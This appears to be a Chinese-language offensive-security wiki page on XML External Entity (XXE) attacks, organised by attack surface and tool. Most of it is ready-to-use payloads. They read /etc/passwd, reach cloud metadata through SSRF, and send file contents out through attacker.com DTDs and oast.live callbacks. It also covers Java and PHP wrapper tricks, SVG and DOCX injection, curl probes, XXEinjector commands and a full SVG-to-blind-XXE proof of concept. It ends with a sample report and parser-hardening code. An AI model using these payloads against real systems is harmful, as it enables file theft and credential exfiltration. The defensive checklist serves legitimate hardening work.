---
type: wiki
category: attack
tool: xxeinjector,burp,manual
status: active
last-updated: 2026-04-21
---

# XXE 深度攻擊（2026 版）

> **用途：** XML External Entity 在 2026 仍是 P1-P2（讀 secrets / SSRF / RCE via Java jar://）。多數 framework 預設擋了 DTD，但遇到老 Java 系統、SOAP、PDF 轉 XML、SVG/DOCX/EPUB/XLSX/SAML import、XML-RPC 還是常中。

## 0. 攻擊面

```
Content-Type: application/xml         → 直接 XXE
text/xml                              → 同上
application/soap+xml                  → SOAP 服務
image/svg+xml                         → SVG 上傳（再被 server parse）
application/vnd.openxmlformats...     → DOCX/XLSX（內含 xml）
application/epub+zip                  → EPUB
application/x-xliff+xml               → 翻譯檔
application/rss+xml / atom+xml        → RSS reader
multipart/form-data（含 xml）          → file upload
```

## 1. 基本 XXE

### 1.1 讀 local file

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

### 1.2 SSRF via XXE

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" >
]>
<foo>&xxe;</foo>
```

見 [66-ssrf-deep.md](66-ssrf-deep.md)。

### 1.3 DTD 被擋 → 用 XInclude

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

某些 server 擋 DTD 但 XInclude 開。

## 2. Blind XXE

當 server 不 reflect response：

### 2.1 Out-of-Band (OOB) via external DTD

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>&exfil;</foo>
```

```xml
<!-- evil.dtd on attacker.com -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 2.2 Parameter Entity exfil（完整鏈）

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<foo/>
```

```xml
<!-- evil.dtd -->
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%data;'>">
%eval;
%exfil;
```

### 2.3 Error-based（無 OOB channel 時）

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo/>
```

Error message 會含 `%file;` 內容 → 從 error 讀取。

## 3. Java 特有技巧

### 3.1 jar:// wrapper（檔案讀取 + temp 檔）

```xml
<!ENTITY % xxe SYSTEM "jar:http://attacker/evil.jar!/file">
```

觸發時 Java 下載 evil.jar 到 temp dir → 可搭其他漏洞讀 temp。

### 3.2 netdoc://（絕對 path）

```xml
<!ENTITY xxe SYSTEM "netdoc:/etc/passwd">
```

### 3.3 ftp:// 外連

```xml
<!ENTITY xxe SYSTEM "ftp://attacker.com/file">
```

### 3.4 XXE to RCE（需特殊 lib）

```xml
<!-- Apache Commons Configuration old + XXE → can load .class -->
<!ENTITY xxe SYSTEM "file:///WEB-INF/lib/">
```

多數 XXE-to-RCE 是 chain（XXE 讀 config → config 有 creds → credential 拿到 → 登入做事）而非直接 RCE。

## 4. PHP 特有技巧

### 4.1 PHP wrapper

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

讀 PHP 原始碼（base64 encode 可繞 binary content 破 XML）。

### 4.2 expect:// wrapper（需 expect extension）

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

幾乎從來沒裝，但試。

### 4.3 data:// wrapper

```xml
<!ENTITY xxe SYSTEM "data://text/plain;base64,PHBocCBzeXN0ZW0oJ2lkJyk7Pz4=">
```

## 5. SVG / DOCX / EPUB XXE

### 5.1 SVG upload

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

若 server 在 upload 後 convert SVG 為其他格式或 thumbnail → XXE 觸發。

### 5.2 DOCX (XML inside ZIP)

```bash
unzip -o x.docx -d docx/
# 編輯 word/document.xml 注入 XXE
# 重 zip
cd docx && zip -r ../evil.docx .
```

### 5.3 XLSX/PPTX 同理

### 5.4 EPUB

EPUB 是 ZIP + XML 目錄，同方式。

## 6. SOAP XXE

```xml
POST /soap HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="...">
  <soap:Body>
    <GetUser>
      <id>&xxe;</id>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

## 7. XML-RPC / REST API 偽裝

### 7.1 強制 Content-Type: xml

若 endpoint 接受 JSON，試換 XML：

```bash
# 原本
Content-Type: application/json
{"id":1}

# 改
Content-Type: application/xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><id>&xxe;</id></root>
```

某些 framework（Spring RestTemplate + MessageConverter）會自動 parse XML 後 bind。

### 7.2 WSDL / SOAP endpoint discovery

```bash
# 經典
/service?wsdl
/soap?wsdl
/api/soap
/ws
```

## 8. 偵測

### 8.1 基本 probe

```bash
# 對任何 XML 相關 endpoint
curl -X POST https://target.com/api/import \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://abc.oast.live/xxe">]><foo>&xxe;</foo>'

# interactsh callback → XXE
```

### 8.2 XInclude 測試

```bash
curl -X POST '...' -d '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://abc.oast.live/"/></foo>'
```

### 8.3 PHP SimpleXML 常見

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
```

## 9. 工具

### 9.1 XXEinjector

```bash
git clone https://github.com/enjoiz/XXEinjector
ruby XXEinjector.rb \
  --host=your.oast.live --httpport=8888 \
  --file=request.txt \
  --path=/etc/passwd --oob=http --verbose
```

自動化 OOB + 探測。

### 9.2 Burp XXE scanner（Pro）

Active scanner audit → XXE 類別。

### 9.3 Nuclei

```bash
nuclei -u https://target.com -tags xxe
```

### 9.4 Interactsh

```bash
interactsh-client -v
# 取 abc.oast.live → 塞入 ENTITY SYSTEM URL
```

## 10. 完整 PoC：SVG upload → Blind XXE → /etc/passwd

### Step 1: 確認 SVG 被 parse

```bash
# 上傳普通 SVG
curl -F "file=@simple.svg" https://target.com/upload
# Response 有 "width/height" metadata → server-side parsing 確認
```

### Step 2: OOB 偵測

```xml
<!-- evil.svg -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg [<!ENTITY % d SYSTEM "http://abc123.oast.live/d.dtd"> %d;]>
<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"/>
```

```xml
<!-- attacker.com/d.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % go "<!ENTITY &#x25; send SYSTEM 'http://abc123.oast.live/x?d=%file;'>">
%go;
%send;
```

上傳 evil.svg → interactsh 看 HTTP callback URL query `d=` → /etc/passwd base64-safe 內容。

### Step 3: 報告

```markdown
## 漏洞概述
https://target.com/upload 接受 SVG 後以 Java XML parser 解析，未禁用外部
entity。攻擊者可構造惡意 SVG 觸發 blind XXE，透過 OOB 通道讀取任意檔案。

## PoC
[evil.svg + evil.dtd + interactsh screenshot showing /etc/passwd]

## Impact
- 讀取任意檔案（/etc/passwd, /WEB-INF/web.xml, /proc/self/environ）
- SSRF 到內網（AWS IMDS）
- 配 AWS IMDS → STS credentials → P1

## Severity
P2（單 XXE 讀檔）/ P1（若鏈到 cloud metadata 或 app secrets）

## 修補
1. XML parser 禁用 DTD / external entity：
   - Java: XMLInputFactory.setProperty("javax.xml.stream.supportDTD", false)
   - PHP: libxml_disable_entity_loader(true) / LIBXML_NOENT 不設
   - Python: defusedxml library
2. SVG upload 後做 rasterize（轉 PNG）再存
3. Content-Type 強制限制（若 API 只接 JSON，嚴格拒絕 xml）
```

## 11. 防禦 checklist（各語言）

### Java

```java
// JAXP
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

### PHP

```php
// PHP 8+ libxml 預設安全；但仍建議：
$dom = new DOMDocument();
$dom->resolveExternals = false;
$dom->substituteEntities = false;
// 禁用 entity loader
libxml_set_external_entity_loader(function(){ return null; });
```

### Python

```python
# 標準庫危險
from xml.etree import ElementTree  # vulnerable
# 改用
import defusedxml.ElementTree as ET
```

### .NET

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;  // .NET Framework 4.5.2+
settings.XmlResolver = null;
```

### Node.js

```js
// 多數 XML parser 預設安全，但 libxmljs / xmldom 要顯式：
const { DOMParser } = require('xmldom');
new DOMParser({
  errorHandler: { warning: () => {} },
  // xmldom 1.x 沒有 entity loader；2.x 默認安全
}).parseFromString(xml, 'text/xml');
```

### Generic

```
1. 禁用 DTD / entity loader
2. 白單 Content-Type，拒絕 xml 若 API 只用 JSON
3. 若一定要 XML，用 XSD schema validation
4. 上傳檔案做 rasterize / normalize
5. Egress firewall（擋 file://，擋內網 http）
```

## 關聯文件

- [62-file-upload-exploitation.md](62-file-upload-exploitation.md) — SVG / DOCX XXE via upload
- [66-ssrf-deep.md](66-ssrf-deep.md) — XXE → Cloud metadata SSRF
- [76-lfi-path-traversal.md](76-lfi-path-traversal.md) — PHP wrapper 鏈
- PortSwigger XXE：https://portswigger.net/web-security/xxe
- OWASP XXE Prevention：https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
- XXEinjector：https://github.com/enjoiz/XXEinjector
